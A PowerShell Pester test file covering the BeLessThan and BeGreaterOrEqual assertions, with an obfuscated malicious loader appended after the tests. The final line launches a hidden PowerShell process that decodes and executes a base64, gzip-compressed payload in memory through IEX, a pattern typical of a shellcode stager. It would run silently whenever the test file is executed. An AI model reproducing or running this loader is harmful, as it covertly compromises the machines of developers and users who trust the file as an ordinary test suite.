Set-StrictMode -Version Latest

InModuleScope Pester {
    Describe "Should -BeLessThan" {
        It "passes if value is less than expected" {
            0 | Should BeLessThan 1
            0 | Should -BeLessThan 1
            0 | Should -LT 1
        }

        It "fails if values equal" {
            { 3 | Should BeLessThan 3 } | Verify-AssertionFailed
            { 3 | Should -BeLessThan 3 } | Verify-AssertionFailed
            { 3 | Should -LT 3 } | Verify-AssertionFailed
        }

        It "fails if value is greater than expected" {
            { 6 | Should BeLessThan 5 } | Verify-AssertionFailed
            { 6 | Should -BeLessThan 5 } | Verify-AssertionFailed
            { 6 | Should -LT 5 } | Verify-AssertionFailed
        }

        It "passes when expected value is negative" {
            -2 | Should -BeLessThan -0.10000000
        }

        It "returns the correct assertion message" {
            $err = { 6 | Should -BeLessThan 5 -Because 'reason' } | Verify-AssertionFailed
            $err.Exception.Message | Verify-Equal 'Expected the actual value to be less than 5, because reason, but got 6.'
        }
    }

    Describe "Should -Not -BeLessThan" {
        It "passes if value is greater than the expected value" {
            2 | Should Not BeLessThan 1
            2 | Should -Not -BeLessThan 1
            2 | Should -Not -LT 1
        }

        It "passes if value is equal to the expected value" {
            1 | Should Not BeLessThan 1
            1 | Should -Not -BeLessThan 1
            1 | Should -Not -LT 1
        }

        It "fails if value is less than the expected value" {
            { 1 | Should Not BeLessThan 3 } | Verify-AssertionFailed
            { 1 | Should -Not -BeLessThan 3 } | Verify-AssertionFailed
            { 1 | Should -Not -LT 3 } | Verify-AssertionFailed
        }

        It "passes when expected value is negative" {
            -1 | Should -Not -BeLessThan -2
        }

        It "returns the correct assertion message" {
            $err = { 4 | Should -Not -BeLessThan 5 -Because 'reason' } | Verify-AssertionFailed
            $err.Exception.Message | Verify-Equal 'Expected the actual value to be greater than or equal to 5, because reason, but got 4.'
        }
    }

    Describe "Should -BeGreaterOrEqual" {
        It "passes if value is greater than the expected value" {
            2 | Should -BeGreaterOrEqual 1
            2 | Should -GE 1
        }

        It "passes if value is equal to the expected value" {
            1 | Should -BeGreaterOrEqual 1
            1 | Should -GE 1
        }

        It "fails if value is less than the expected value" {
            { 2 | Should -BeGreaterOrEqual 3 } | Verify-AssertionFailed
            { 2 | Should -GE 3 } | Verify-AssertionFailed
        }

        It "passes when expected value is negative" {
            -0.01 | Should -BeGreaterOrEqual -0.1
        }

        It "returns the correct assertion message" {
            $err = { 4 | Should -BeGreaterOrEqual 5 -Because 'reason' } | Verify-AssertionFailed
            $err.Exception.Message | Verify-Equal 'Expected the actual value to be greater than or equal to 5, because reason, but got 4.'
        }

        Describe "Should -Not -BeGreaterOrEqual" {
            It "passes if value is less than the expected value" {
                0 | Should -Not -BeGreaterOrEqual 1
                0 | Should -Not -GE 1
            }

            It "fails if values equal" {
                { 3 | Should -Not -BeGreaterOrEqual 3 } | Verify-AssertionFailed
                { 3 | Should -Not -GE 3 } | Verify-AssertionFailed
            }

            It "fails if value greater than expected" {
                { 6 | Should -Not -BeGreaterOrEqual 5 } | Verify-AssertionFailed
                { 6 | Should -Not -GE 5 } | Verify-AssertionFailed
            }

            It "passes when expected value is negative" {
                -0.2 | Should -Not -BeGreaterOrEqual -0.1
            }

            It "returns the correct assertion message" {
                $err = { 6 | Should -Not -BeGreaterOrEqual 5 -Because 'reason' } | Verify-AssertionFailed
                $err.Exception.Message | Verify-Equal 'Expected the actual value to be less than 5, because reason, but got 6.'
            }
        }
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIEmCVgCA7VWa2/aSBT9nEr9D1aFZFslGAhJ2kiVdsz7YQIxmFdRNbHHZmDwEHuAQLf/fa/BTsi2qbK7Wgvkedw7c+bcc+faXfu2oNyXNgU/d9fA0vf37846OMBLSUk5410z15j30lJq37w2kL+4Us/OwCC1vETh5dC4lb5IygStViW+xNSf3twU10FAfHHsZ6pEoDAky3tGSaio0p/SYEYCcn57Pye2kL5LqW+ZKuP3mMVmuyK2Z0Q6R74TzbW4jSN0GXPFqFDkr19ldXKem2bKD2vMQkU2d6Egy4zDmKxKP9Row95uRRTZoHbAQ+6KzID6F/lM3w+xS9qw2oYYRMy4E8oqnAR+ARHrwJeezhQtcjRRZGh2Am4jxwlICB6Zur/hC6Kk/DVjaekPZRIjuFv7gi4JzAsS8JVJgg21SZipYd9h5I64U6VNtsnB3+qknDqBVUcEahoC8wpUgztrRo7esvoz2KeAqvCcBhWY+PH+3ft3bqIGEvKH+q7p7PRTQUDrbHJoEwCsdHhID9ZfpGxaMmBbLHiwg26qF6yJOpUmUTAm06mU2q5wrdlsNdroIf36MrnEBzz2lmk1YGxicepMwScOVyq0i3o0/rrsSsSlPintfLykdqIs5VcBIC4jhxNnErM2oFLkeII4JcKIh0VEZ1qa/OxWXlLx5KuvKXNIgGwIYgioIL7qSzDHCCly3TfIErg69mWIhQt6Jol1rOFdsnvUByO5yHAYpqXOGhLKTksmwYw4aQn5IY2n0FrwQ1N+hmusmaA2DkWy3FRNeIz3K3I/FMHahvDB2XvmitgUs4iKtFSjDtF3JvWSfeVfElHEjFHfg5U2EAgYiQgwRSSKACCeCkDNmETUlytGlmB6SPAKwx6kc5wQBzFhjzjy34EmYj8qO6Ik4eIEJsTZZFykJYsGAu6JiN6Dmv4TjJOb4gCoGJA4MkqSPhN9JyK5p8jG7yxIJNKYqAMtgQBKKgFf6jgkVwVTBECY8kG7pUUEz6juM8PWFzSHtjRXN+Dfpxd1Xrp2mo15TQtKjzMX1cO6UeuUurVaYdMwrYIwy3XR7NSFUR7O5yaq3fVHYlxHtR7NLkaF/apB92YLOaNH7Wqv77dZ/XE/9xx3VHJd79o173KXFdoaFLt6No9bpfK6NdC3erYQlum21qX97qJREfcji+G+q3nD3GdMH1vB3MpxY19HqDq7sPcN16rODGc3qmmfB4UFKiNU9MtWRefNkR6gjmZhz+LbpqfjpVdEum1QMu72K3q3W9FRvzp/KH3WPPAd4pk+sPJ0vBrezaBfAQhNLVuoO2TPR10gqcoR9u7Axivm7ZkLNqWPSP/Y5mEeL3SOdLCpjB8A12hV6TCY7/XzHFmsPcSoNd5VNC036hRQLUsHVQ9FS2JP72IUbkr7kpazHO4MLtsjV7OG7ForFXsr29U0bVsrNe1x7vHT7fWn1oBaS476mmZ9iJQB0kjZq/ynb3q+vq8Msydxf+2GN3AQzjADPcC1naRlhQeV+ALucBp5KEpSlhck8AmDQgalLtE1YozbUT04ua2hIh3rxBSytA/Ni/wvW6r0ZKg+V4pk6OZmDHAhXY5CzrSI74lZOvt4kc3CVZ99LGTh4G8/ZJGvdkq8WDoqFi/4et6HHfZRo1xKbXi5V+3eFv53NuNEnsHLeRubz2O/mX0Tw9n0SyZ+mn458I9I/zdcDDAVYGzCxcTIsVb+jpJYSyefGknUQCtu/ESffbdrcd6Gr5C/AG9t+iZvCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

